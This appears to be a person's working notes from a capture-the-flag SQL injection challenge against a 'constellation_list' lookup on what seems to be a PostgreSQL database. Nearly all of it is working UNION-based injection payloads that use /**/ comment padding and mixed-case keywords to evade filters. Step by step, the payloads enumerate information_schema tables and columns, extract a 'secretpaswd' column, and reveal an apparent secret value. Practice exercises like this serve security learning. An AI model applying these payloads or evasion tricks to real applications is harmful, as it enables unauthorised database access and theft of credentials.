-- When inputing ':
SELECT ...star FROM constellation_list WHERE abbreviation = '' 'LIMIT 1    '

-- We can see that there is a LIMIT 1 that: clause would return 3 records in the result set with an offset of 1. What this means is that the SELECT statement would skip the first record that would normally be returned and instead return the second, third, and fourth records.
-- I can't see the first clause!

-- Can only have 4 columns 

--What I want to do is know the format of the table, and the table names
SELECT * FROM ? WHERE password = '' UNION SELECT  FROM information_schema.tables WHERE table_name = '%'

SELECT ...star FROM constellation_list WHERE abbreviation = '' UNION SELECT  FROM information_schema.tables WHERE table_name = '%'' 'LIMIT 1    '

--SQL Parsed:
'/**/UNION/**/SELECT/**/table_name,2,3,4/**/FROM/**/information_schema.tables/**/WHERE/**/t.table_name/**/=/**/'%

'/**/UnIoN/**/SeLeCt/**/table_name,table_schema,table_catalog,table_type/**/FrOm/**/information_schema.tables/**/WhErE/**/table_name/**/NOT/**/LIKE/**/'pg_%

=> It needs to end on a string
'/**/UnIoN/**/SeLeCt/**/table_name,table_schema,table_catalog,table_type/**/FrOm/**/information_schema.tables/**/WhErE/**/table_type/**/NOT/**/LIKE/**/'VIEW'/**/AND/**/table_name/**/NOT/**/LIKE/**/'pg_%'/**/OFFSET/**/'1

=> NOTE: -- is an invalid character and # is also an invalid character.
=> We know that the table_types of the passwords/secrets would not be temporary, nor of VIEW types as it would not be easily printable
=> VIEW AND THAN BASE TABLE

'/**/UnIoN/**/SeLeCt/**/table_name,table_schema,table_catalog,table_type/**/FrOm/**/information_schema.tables/**/WhErE/**/table_name/**/NOT/**/LIKE/**/'pg_%'/**/OFFSET/**/'1
  -> Gets the first value that satisfies the condition ("Actually the second because of LIMIT 1")

DISCOVER THE NAME OF THE TABLE!!
'/**/UnIoN/**/SeLeCt/**/table_name,table_schema,table_catalog,table_type/**/FrOm/**/information_schema.tables/**/WhErE/**/table_type/**/NOT/**/LIKE/**/'VIEW'/**/AND/**/table_name/**/NOT/**/LIKE/**/'pg_%'/**/OFFSET/**/'1
    => SOL: constellation_secrets } it must be it


DISCOVER THE COLUMNS OF THE TABLE!!
'/**/UnIoN/**/SeLeCt/**/table_name,table_schema,column_name,data_type/**/FrOm/**/information_schema.columns/**/WhErE/**/table_name/**/LIKE/**/'constellation_secrets'/**/AND/**/column_name/**/LIKE/**/'%'/**/OFFSET/**/'0
    => SOL: secretpaswd } it must be it
    => id
    => constellation_id

DISCOVER THE VALUE I WANT
'/**/UnIoN/**/SeLeCt/**/secretpaswd,NULL,NULL,NULL/**/FrOm/**/constellation_secrets/**/WhErE/**/secretpaswd/**/LIKE/**/'%'/**/OFFSET/**/'0
    => 4Tq26BVhRSJr9LYySFRr0A